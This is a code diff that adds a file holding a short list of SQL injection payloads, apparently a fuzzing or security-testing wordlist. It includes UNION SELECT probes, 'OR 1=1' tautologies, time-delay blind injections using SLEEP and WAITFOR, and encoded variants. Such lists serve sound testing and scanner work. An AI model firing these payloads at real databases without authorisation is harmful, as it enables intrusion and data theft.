@@ -1,0 +1,14 @@
+'UNION(SELECT(1),(2),(3))--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT 1,2,3--
+');SELECT(1)FROM(SELECT(SLEEP(5)))a--
+' AND 1=1--
+' AND '1'='1
+') OR ('1'='1
+1; SELECT SLEEP(5)--
+1 WAITFOR DELAY '0:0:5'--
+' OR 1=1#
+\" OR 1=1--
+\' OR \'1\'=\'1
+%27 OR %271%27%3D%271
+1' ORDER BY 1--
